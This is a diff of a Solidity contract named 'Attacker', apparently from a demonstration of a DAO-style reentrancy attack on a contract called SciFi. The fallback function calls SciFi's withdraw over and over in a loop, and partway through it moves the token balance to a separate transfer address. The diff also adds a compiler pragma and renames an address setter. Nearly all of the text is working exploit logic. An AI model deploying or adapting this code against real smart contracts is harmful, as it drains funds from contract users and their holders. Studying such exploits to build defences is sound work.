@@ -1,3 +1,5 @@
+pragma solidity ^0.4.13;
+
 import "./SciFi.sol";
 
 contract Attacker {
@@ -12,10 +14,9 @@ contract Attacker {
   function () payable {
     DefaultFunc(msg.sender,msg.value,a,SciFi(scifiAddress).balances(this)-1);
     while (a<5) {
-        a++;
+      a++;
       arr.push(a); //to help debug
-    //  if (scifiAddress.balance-2*msg.value < 0){
-    if (a==4){
+      if (a==4){
           SciFi(scifiAddress).transferTokens(transferAddress,SciFi(scifiAddress).balances(this)-1);
       }
       SciFi(scifiAddress).withdraw(this);
@@ -43,8 +44,8 @@ contract Attacker {
     a               =0;
   }
 
-  function setDAOAddress(address _dao){
-    scifiAddress      =_dao;
+  function setSciFiAddress(address _scifi){
+    scifiAddress      = _scifi;
   }
   function setTransferAddress(address _transferAddress){
     transferAddress =_transferAddress;
